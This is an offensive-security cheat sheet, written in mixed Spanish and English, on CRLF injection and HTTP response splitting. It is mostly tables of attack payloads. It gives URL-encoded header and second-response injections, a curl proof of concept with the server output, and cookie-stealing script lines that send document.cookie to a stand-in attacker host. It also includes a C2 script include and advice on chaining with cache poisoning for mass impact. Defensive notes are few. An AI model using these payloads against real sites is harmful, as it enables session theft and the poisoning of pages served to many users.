---
aliases:
  - HTTP Response Splitting
  - Response Splitting XSS
  - Body Injection via CRLF
tags:
  - type/technique
  - vuln/crlf-injection
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[CRLF Injection]]'
  - '[[Cross-Site Scripting (XSS)]]'
---
# CRLF Injection - HTTP Response Splitting

***

## Split Single Response en Two

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Two CRLF terminate headers | `\r\n\r\n` separa headers de body | Standard HTTP. |
| Atacante injects `\r\n\r\n` mid-headers | Server's body becomes "second response start" | Splitting. |
| Encoding | `%0d%0a%0d%0a` URL-encoded | Standard. |
| Body inject continues | Whatever follows interpretado as new HTTP response | Atacante controls. |
| Multiple responses confused | Browser/proxy may interpret either | Per-stack. |
| Cache poisoning combine | Cached response stores poisoned headers + body | Mass impact. |
| Combine con HRS | Smuggle vector via splitting | Multi-vector. |
| Force second response | Atacante's body has new status line | Two distinct responses. |
| Browser behavior | Browser may render second response | XSS chain. |
| Proxy / cache behavior | Proxy may forward both | Per-config. |
| HTTP/1.1 only viable | HTTP/2 binary framing prevents text-based splitting | H1 specific. |
| Modern mitigations | Most servers reject `%0d%0a` en headers now | Defense baseline. |
^crlfi-split-twores

___

## Inject Second Response con HTML/JS

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Full HTTP response inject | `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>...</html>` | Complete response. |
| Status line | `HTTP/1.1%20200%20OK` | New status. |
| Content-Type | `Content-Type:%20text/html` | Force HTML render. |
| Content-Length | `Content-Length:%20<N>` | Match body length. |
| Body con XSS | `<script>alert(document.cookie)</script>` | XSS. |
| Body con phishing | Fake login form | Phishing. |
| Body con malware redirect | Auto-download | Drive-by. |
| Body con persistent JS | `<script src="//attacker/c2.js">` | C2. |
| Combine con cache poisoning | Cache stores split response | Mass victim. |
| Stored XSS via cache | Persistent | Long-lived. |
| Cookie-stealing JS | `<script>fetch('//attacker/?c='+document.cookie)</script>` | Direct theft. |
| Combine con SOP confusion | Browsers handle differently | Edge. |
| Modern defenses | Most servers prevent splitting now | Detection. |
| HTTP/1.0 vs HTTP/1.1 | Subtly different parsing | Edge. |
^crlfi-split-secondres

### PoC HTTP Response Splitting

```bash
# Atacante's payload (URL-encoded):
PAYLOAD='ok%0d%0aSet-Cookie:atacante=1%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20100%0d%0a%0d%0a<html><body><script>alert(document.cookie)</script></body></html>'

# Send request
curl -i "https://target.com/redirect?url=$PAYLOAD"

# Server response (raw):
HTTP/1.1 302 Found
Location: ok
Set-Cookie: atacante=1                  ← injected header

HTTP/1.1 200 OK                          ← injected response start
Content-Type: text/html
Content-Length: 100

<html><body><script>alert(document.cookie)</script></body></html>

# Browser interprets second response → XSS executes
# Or proxy/cache stores split response → mass victim impact
```

___

## XSS via Response Splitting

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Inject `<script>` body | Standard XSS payload en split body | Direct. |
| Steal cookies | `<script>fetch('//attacker/?c='+document.cookie)</script>` | Combine. |
| Persistent via cache | Cache stores XSS body | Mass impact. |
| Bypass CSP | If CSP injected en split → atacante controls policy | Combine. |
| Combine con OAuth | OAuth flow with response splitting | Federated XSS. |
| Combine con login redirect | Atacante redirects victim → split response → XSS | Multi-step. |
| Storage XSS via cache | TTL-bound persistencia | Standard. |
| Reflected XSS via cache | Per-URL cached response | Persistent. |
| Combine con HRS | Smuggle response with XSS body | Compound. |
| HTML5 features | `<form>` con auto-submit | No JS XSS. |
| `<iframe srcdoc>` | Inline iframe content | Sandboxed XSS. |
| postMessage exploitation | Cross-frame XSS | Edge. |
^crlfi-split-xss

___

## Cache Poisoning via Splitting

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Cache stores split response | Cache key normal, response includes split | Mass victim. |
| Persistencia por TTL | All users hit cache → see XSS body | Standard. |
| Bypass TTL via long max-age | Atacante injects cache-control | Compound. |
| Combine con WCP | Web Cache Poisoning + CRLF splitting | Multi-vector chain. |
| Multi-tier cache propagation | CDN + proxy + origin | Cascading. |
| Combine con HRS | Smuggle response + cache | Most powerful chain. |
| Selective targeting | Cache key per-region/user | Limited reach. |
| HTTP/2 considerations | Cache behavior differs | Per-stack. |
| Detection | Same URL different responses indicates poisoning | Audit. |
| Time-window | Atacante chooses peak traffic for max impact | Operational. |
^crlfi-split-cache

***
